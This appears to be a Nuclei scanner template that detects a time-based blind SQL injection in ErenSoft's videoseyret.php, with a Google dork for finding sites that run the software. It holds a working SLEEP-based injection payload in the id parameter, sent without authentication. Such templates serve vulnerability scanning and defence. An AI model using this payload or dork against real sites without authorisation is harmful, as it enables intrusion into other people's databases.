http:
- matchers:
  - condition: and
    dsl:
    - duration >= 6
    - status_code == 200
    - contains(content_type, "text/html") && contains(body, "videoseyret")
    type: dsl
  - type: word
    words:
    - class="entry-title"
  matchers-condition: and
  raw:
  - '@timeout: 20s

    GET /videoseyret.php?id=95%20AND%20(SELECT%204581%20FROM%20(SELECT(SLEEP(6)))NyiX)
    HTTP/1.1

    Host: {{Hostname}}

    '
id: erensoft-sqli
info:
  author: r3Y3r53
  description: 'SQL Injection is a type of SQL injection attack in which an attacker
    can exploit a vulnerability in a web application''s input fields to manipulate
    the application''s SQL queries.

    '
  metadata:
    google-query: intext:"Kodlama:Erensoft"
    max-request: 1
    verified: true
  name: ErenSoft - SQL Injection
  reference:
  - https://cxsecurity.com/issue/WLB-2023070055
  severity: high
  tags: sqli,unauth,erensoft,vuln
